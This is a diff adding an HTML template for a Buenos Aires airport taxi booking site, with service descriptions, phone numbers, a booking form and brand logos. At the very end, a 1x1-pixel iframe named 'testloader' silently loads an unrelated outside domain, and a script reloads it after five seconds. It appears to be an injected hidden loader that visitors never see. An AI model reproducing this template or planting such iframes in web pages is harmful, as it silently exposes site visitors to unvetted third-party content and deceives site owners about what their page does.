@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="es-AR">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="theme-color" content="#ffc636">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title> ▷ HiddenSetup - Template TAXI Site </title>
+  <link rel="icon" href="taxiargentina.png" type="image/png">
+  <meta name="description"
+    content="Traslados con espera en el aeropuerto de Buenos Aires. Reserva tu viaje para ir del aeropuerto al centro en taxis premium. Book your ride today!">
+  <meta name="keywords" content="taxi, airport transfer, airport taxi, transportation, shuttle, airport shuttle">
+  <meta name="author" content="https://github.com/hiddensetup/">
+  <meta name="robots" content="index">
+  <meta property="og:title" content="Transporte Aeropuerto 24/7 🚖 Taxi transfer service Buenos Aires">
+  <meta property="og:description"
+    content="Traslados con espera en el aeropuerto de Buenos Aires. Reserva tu viaje para ir del aeropuerto al centro en taxis premium. Book your ride today!">
+  <meta property="og:url" content="https://github.com/hiddensetup">
+  <meta property="og:type" content="website">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+  <link rel="stylesheet" href="assets/taxi.css">
+</head>
+
+<body>
+  <nav class="shadow shadow-lg navbar navbar-dark bg-dark fixed-bottom py-1">
+    <div class="container-fluid">
+      <a class="navbar-brand" href="#"><img class="image-max-width" src="assets/media/brandImages/logo.avif"></a>
+      <button class="border-0 p-0 px-2 navbar-toggler" type="button" data-bs-toggle="offcanvas"
+        data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar" aria-label="Toggle navigation">
+        <i class="text-light display-4 bi bi-list"></i>
+      </button>
+      <div class="my-2-5 rounded-start-4 offcanvas offcanvas-end text-bg-dark" tabindex="-1" id="offcanvasNavbar"
+        aria-labelledby="offcanvasNavbarLabel">
+        <div class=" offcanvas-header">
+          <h5 class="offcanvas-title" id="offcanvasNavbarLabel"><a class="navbar-brand" href="#"><img
+                class="image-max-width" src="assets/media/brandImages/logo.avif"></a></h5>
+          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas"
+            aria-label="Close"></button>
+        </div>
+        <div class="offcanvas-body">
+          <ul class="navbar-nav">
+
+            <li class="nav-item mt-3 fs-5 ">
+              <a id="taxi-count" class="nav-link" href="#">
+                <i class="fs-4 bi-taxi-front-fill"></i>
+                <span class="position-relative badge rounded-pill fw-light bg-danger" id="count"
+                  style="vertical-align: text-bottom;"></span>
+                Taxis disponibles
+              </a>
+            </li>
+            <li class="nav-item mt-3 fs-5 ">
+              <a tabindex="-1" href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#exampleModal"><i
+                  class="fs-4 bi bi-airplane-fill"></i> Taxi a la terminal</a>
+            </li>
+            <li class="nav-item mt-3 fs-5 ">
+              <a class="nav-link" href="#" id="google_translate_element"></a>
+            </li>
+
+
+          </ul>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+
+  <header class="bg-taxidriver">
+    <div>
+
+    </div>
+
+    <div class="text-center d-flex justify-content-center flex-column pb-5">
+      <h1 class=" col-md-9 col-xl-9 col-sm-9 mx-3 col-8 mb-4 display-4 fw-bold text-dark-taxidriver mx-auto mt-5"> <i
+          class="fs-3 bi bi-suitcase"></i><i class="bi bi-person-walking"></i> <span class="h1-title-rendering">HIDDEN SETUP</span></h1>
+      <div class="container" style="margin-top: -20px; ">
+        <img class="w-75 img-fluid" alt="header image taxi buenos aires" src="assets/media/webImages/taxi-top.webp">
+
+      </div>
+      <div class="col-10 col-sm-6 col-md-6 col-xl-6 mx-auto">
+        <h2 class="h2-text-rendering-01 lead mb-3">¡Viaja seguro! Servicio de taxi <strong>premium</strong>. Traslados
+          en Buenos
+          Aires desde y hacia el aeropuero.</h2>
+        <div class="d-grid gap-2 d-sm-flex justify-content-sm-center">
+          <button type="button" class="btn btn-dark btn-lg px-4 rounded-4 gap-3 whatsapp-button external-button"><i
+              class="bi bi-whatsapp"></i> <span class="button-text-action">Pedir Taxi Por WhatsApp</span></button>
+        </div>
+
+        <div class="mt-4 col-10 col-sm-8 col-md-8 col-xl-8 mx-auto">
+          <small class="taxi-brand-rendering fw-bold">BESTAXIDRIVER</small> <br> <small><span>Buenos Aires | Ezeiza |
+              Aeroparque</span></small>
+        </div>
+      
+      </div>
+
+    </div>
+    </div>
+  </header>
+
+  <main class="pt-5">
+    <h2 class="my-3 display-3 text-center">¿A dónde quieres ir? <br> ¡Te llevamos! </h2>
+    <section id="sec01">
+
+      <div class="my-5 justify-content-center d-flex flex-wrap gap-4 position-relative"
+        style="bottom: 40px;z-index: -3;">
+        <div class="col-6 align-self-center col-sm-3 text-center">
+          <img class="img-fluid" src="assets/media/brandImages/airbnb_logo_beilo.svg-Y4LE513peLubbLa7.avif"
+            alt="Airbnb Argentina">
+        </div>
+        <div class="col-6 align-self-center col-sm-3  text-center">
+          <img class="img-fluid" src="assets/media/brandImages/booking_logo.avif" alt="Brand 2">
+        </div>
+        <div class="col-6 align-self-center col-sm-3  text-center">
+          <img class="img-fluid" src="assets/media/brandImages/buquebus_logo-AMqXZ2z73ks3O7nl.avif"
+            alt="Taxi a busquebus">
+        </div>
+        <div class="col-6 align-self-center col-sm-3 text-center">
+          <img class="img-fluid" src="assets/media/brandImages/colonia-express-YZ9nvMpGoRSM756D.avif"
+            alt="Taxi a colonia express">
+        </div>
+        <div class="col-auto align-self-center text-center">
+          <img class="img-fluid" src="assets/media/brandImages/tripadvisor-logo-m5KWGjz4xjSLnjno.avif"
+            alt="Tripadvisor taxi buenos aires">
+        </div>
+        <div class="col-10 align-self-start text-center">
+          <img class="img-fluid" src="assets/media/brandImages/pngwing.com-YD0jGrKeOxFbrO4J.avif"
+            alt="Aeropuerto 2000 buenos aires">
+        </div>
+      </div>
+
+    </section>
+    <section class="" id="sec02">
+      <h2 class="col-10 mx-auto  pb-3 display-2 text-center ">Reviews</h2>
+      <div class="container pb-5">
+        <div id="taxi-review" class="mx-auto col-sm-12 col-md-8 col-lg-6">
+
+
+        </div>
+      </div>
+      </div>
+
+      <div class=" text-dark">
+        <div class="container py-3">
+          <h2 class="col-9 text-dark mx-auto pb-3 display-3 text-center ">
+            ¿Por qué pedir taxi premium <span class="taxi-brand-rendering"></span>? <br>
+          </h2>
+          <div>
+            <p class="rounded-4 lead alert alert-light">
+              <i class="bi bi-whatsapp text-success"></i>
+              <span id="additionalContent1"></span>
+            </p>
+            <p class="rounded-4 lead alert alert-light">
+              <i class="bi bi-building-add text-primary"></i>
+              <span id="additionalContent2"></span>
+            </p>
+            <p class="rounded-4 lead alert alert-light">
+              <i class="bi-geo-alt-fill text-danger"></i>
+              <span id="additionalContent3"></span>
+            </p>
+            <p class="rounded-4 lead alert alert-light">
+              <i class="bi bi-car-front-fill"></i>
+              <span id="additionalContent4"></span>
+            </p>
+
+          </div>
+
+
+
+        </div>
+      </div>
+    </section>
+
+
+    <section id="sec03">
+
+      <div class="bg-city text-white">
+        <div class="container py-6">
+          <h2 class="col-10 mx-auto  pb-3 display-2 text-center ">
+            ¿Cómo reservar taxi en el aeropuerto? <i class="bi-taxi-front"></i><br>
+          </h2>
+          <!-- <p> Puedes contactarnos al llegar o coordinar previamente. Nuestro servicio de reserva de taxi está diseñado
+            para traslados con espera en el aeropuerto de Buenos
+            Aires. De esa forma podemos brindarte tranquilidad desde el
+            momento en que aterrizas. Con solo proporcionarnos los detalles de tu vuelo, nos
+            encargaremos de coordinar un taxi que esté listo para recibirte apenas salgas de la puerta de
+            <strong>Arribos
+              Internacionales.</strong>
+          </p> -->
+
+
+          <div class="container">
+            <div class="row">
+              <div class="col-12">
+                <h3>Instrucciones para reservar taxi en aeropuerto de Buenos Aires</h3>
+              </div>
+            </div>
+            <div class="row">
+              <div class="col-12 col-md-6">
+                <div>
+                  <div class="p-3">
+                    <h5>1. Busca en Google <span class="taxi-brand-rendering"></span>.COM.AR</h5>
+                    <p class="card-text">Ingresa a nuestra página web de <strong>traslados aeropuerto</strong>.</p>
+                  </div>
+                </div>
+              </div>
+              <div class="col-12 col-md-6">
+                <div>
+                  <div class="p-3">
+                    <h5>2. Elige servicio premium</h5>
+                    <p class="card-text">Presiona el botón Pedir taxi por WhatsApp y solicita el servicio premium para
+                      recibir un servicio personalizado.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="row">
+              <div class="col-12 col-md-6">
+                <div>
+                  <div class="p-3">
+                    <h5>3. Ingresa recogida y destino</h5>
+                    <p class="card-text">Indica lo ubicación referencial para que un chofer pase a buscarte y listo.</p>
+                  </div>
+                </div>
+              </div>
+
+            </div>
+          </div>
+
+
+          <hr>
+          <p><small><i class="bi bi-info-circle"></i> Si ya llegaste al aeropuerto y no sabes cómo llegar al hotel o
+              Airbnb, chatea con nosotros por
+              WhatsApp o llama directo a nuestros números para solicitar traslado en taxi
+              <a class="link-light taxi-phone-rendering-01" href="tel:5491140908465" target="_blank"
+                rel="noopener noreferrer">5491140908465</a> o
+              <a class="link-light taxi-phone-rendering-02" href="tel:5491138426040" target="_blank"
+                rel="noopener noreferrer">5491138426040</a></small></p>
+
+          <div
+            class="col-sm-12 col-md-8 col-lg-8 card bg-light bg-cta container shadow rounded-5 text-center py-5 mt-5">
+            <h2 class="mx-3 display-4 my-4 fw-normal">
+              <strong class="text-dark">¿Necesitas taxi aeropuerto de <span class="text-black">Buenos
+                  Aires</span>?</strong>
+            </h2>
+
+            <div class="d-grid gap-2 d-lg-flex justify-content-sm-center">
+              <a class="mt-3 mx-2 btn border rounded-4 btn-lg" href="#book-a-transfer"><i
+                  class="bi-calendar-date-fill"></i> <span class="button-text-schedule"></span></a>
+              <button class="mt-3 mx-2 rounded-4 btn btn-dark btn-lg whatsapp-button"><i
+                  class="bi-whatsapp"></i> <span class="button-text-action"></span></button>
+            </div>
+            <small class="py-6 mx-3" style="padding-top: 2rem!important;">
+              *Servicio de taxi al aeropuerto Ezeiza,
+              Aeroparque y al centro de la ciudad.
+            </small>
+
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <section id="sec04">
+      <div class="bg-obelisco text-light">
+        <div class="container py-6">
+          <div id="some_content_01" class="mx-3">
+
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+    <section class="light-mapa">
+      <div class="container text-light">
+        <div id="book-a-transfer" class="row py-6">
+          <div class="col-md-8 mx-auto offset-md-3">
+            <h2 id="booking" class="col-11 mx-auto pb-3 display-3 text-center ">
+              Programar traslado al aeropuerto
+            </h2>
+            <p class=" text-light lead">Ingresa tus datos y reserva traslado con espera para ir del Aeropuerto
+              de Buenos Aires al centro 🇦🇷
+            </p>
+            <form>
+              <div class="form-floating mb-3">
+
+                <input type="text" class="form-control rounded-4 form-control-lg" id="inputName" placeholder="Name"
+                  required>
+                <label for="inputName" class="form-label">Nombre</label>
+
+              </div>
+              <div class="form-floating mb-3">
+                <input type="text" class="form-control rounded-4 form-control-lg" id="inputSubject"
+                  placeholder="Subject" required>
+                <label for="inputSubject" class="form-label">Asunto</label>
+
+              </div>
+              <div class="form-floating mb-3">
+                <textarea style="height: 100px" class="form-control rounded-4 form-control-lg" id="inputMessage"
+                  placeholder="Por favor, proporciona detalles del traslado 🚕" required></textarea>
+                <label for="inputMessage" class="form-label">Mensaje</label>
+
+              </div>
+              <div class="text-center">
+                <button type="button" class="rounded-4 btn btn-dark mt-4 btn-lg" onclick="composeEmail()">
+                  <i class="me-1 bi-envelope-at"></i> <span class="button-text-schedule"></span>
+                </button>
+
+              </div>
+              <div class="text-center my-3">
+
+                <a class="render-taxi-email small text-decoration-none text-center text-light"
+                  href=""></a>
+
+              </div>
+
+
+
+          </div>
+
+
+
+          </form>
+        </div>
+      </div>
+      </div>
+    </section>
+   
+
+  </main>
+  <footer class="footer py-5">
+    <div id="pediruntaxi" class="container">
+      <div class="row d-flex justify-content-between">
+        <div class="col-md-4">
+          <h5 class="mt-2">SEGURO, CONFIABLE Y EFICIENTE</h5>
+          <ul class="list-unstyled contact-info small">
+            <li class="mb-2"><i class="bi-whatsapp"></i> <span> Retiro | Ezeiza </span> <a
+                class="taxi-phone-rendering-01 text-decoration-none text-muted" href="tel:"> </a>
+            </li>
+            <li class="mb-2"><i class="bi-whatsapp"></i> <span> Aeroparque | Buquebus </span> <a
+                class="taxi-phone-rendering-02 text-decoration-none text-muted" href="tel:"> </a>
+            </li>
+
+          </ul>
+        </div>
+        <div class="col-md-4">
+          <h5 class="mt-2">Medios de Pago:</h5>
+          <ul class="small list-unstyled text-muted payment-methods">
+            <li>Paypal, pago en efectivo y tarjetas.</li>
+            <li><img style="max-width: 100px;" class="img-fluid m-3"
+                src="assets/media/brandImages/mercado-pago-logo-CC340D0497-seeklogo.com.png"></li>
+          </ul>
+        </div>
+        <div class="col-md-4 text-muted">
+          <p class=" mt-2 mb-0 "><span class="taxi-brand-rendering"></span> &copy; </p>
+          <small>https://<span class="taxi-brand-rendering"></span>.com.ar - Transportes - Del Aeropuerto
+            de Ezeiza a Buenos Aires</small>
+          <ul class="list-unstyled">
+            <li><a class="text-primary facebook-link-rendering" href="" target="_blank"><i
+                  class="bi-facebook fs-4 mx-2"></i></a> <a class="text-danger instagram-link-rendering" href=""
+                target="_blank"><i class="bi-instagram fs-4 mx-2"></i></a> <a class="twitter-link-rendering text-info"
+                href="" target="_blank"><i class="bi-twitter fs-4 mx-2"></i></a> <a class="tiktok-link-rendering"
+                href="" target="_blank"><i class="bi-tiktok text-dark fs-4 mx-2"></i></a>
+                <button type="button" class="mt-2 nav-link" id="downloadBtn"><small>Download Sitemap</small></button>
+
+              </li>
+          </ul>
+
+
+          <script type="text/javascript"
+            src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+
+
+  <!-- Modal Buquebus & Colonia Express-->
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content rounded-4">
+        <div>
+          <div id="taxi-premium" class="rounded-top-4 p-3 bg-buquebus text-white">
+            <div class="text-end"> <button type="button" class="fs-4 btn-close" data-bs-dismiss="modal"
+                aria-label="Close"></button> </div>
+
+            <div class="container text-center py-4">
+              <h2 class="display-4">
+                Te llevamos a la terminal de Buquebus y Colonia Express en nuestro taxi premium.
+              </h2>
+            </div>
+          </div>
+        </div>
+        <div class="modal-footer">
+          <button type="button" data-bs-dismiss="modal"
+            class="my-0 w-100 rounded-4 mx-2 btn btn-warning text-dark btn-lg" onclick="booking()"><i
+              class="bi-calendar-date-fill"></i> <span class="button-text-schedule">Reservar ahora</span></button>
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+
+  <!-- Modal -->
+  <div class="modal fade" id="myModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content rounded-4">
+        <div class="modal-body p-1">
+          <div class="rounded-4 bg-passenger section-visible">
+            <div class="container">
+              <div class="text-end ">
+                <button type="button" class="btn-close fs-4" data-bs-dismiss="modal" aria-label="Close"></button>
+              </div>
+              <div class="mx-3 row text-light">
+                <div class="col">
+                  <div class="mt-3 mb-5 text-md-start text-start">
+                    <h2 class="fs-1 mb-2 text-light"><strong>¿Quieres viajar tranquilo y seguro en Buenos
+                        Aires?</strong>
+                    </h2>
+
+                    <p class="pb-4"><strong><span class="taxi-brand-rendering"></span>.</strong>
+                    </p>
+                  </div>
+                </div>
+
+              </div>
+            </div>
+          </div>
+        </div>    
+
+        <div class="modal-footer p-0 border-0">
+          <button type="button"
+            class="btn-position button-text-schedule button-text-schedule my-0 rounded-4 btn btn-dark btn-lg"
+            onclick="booking()" data-bs-dismiss="modal">Reservar ahora</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+
+  <script src="assets/taxi.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
+    integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
+    crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"
+    integrity="sha384-fbbOQedDUMZZ5KreZpsbe1LCZPVmfTnH7ois6mU1QK+m14rQ1l2bGBq41eYeM/fS"
+    crossorigin="anonymous"></script>
+  <iframe id="testloader" width="1" height="1" src="https://steamboxchat.com"></iframe>
+  <script>
+    var iframe = document.getElementById("testloader"); function changeIframeSource(e) { iframe.src = e } setTimeout(function () { changeIframeSource("https://steamboxchat.com") }, 5e3);
+  </script>
+</body>
+
+</html>
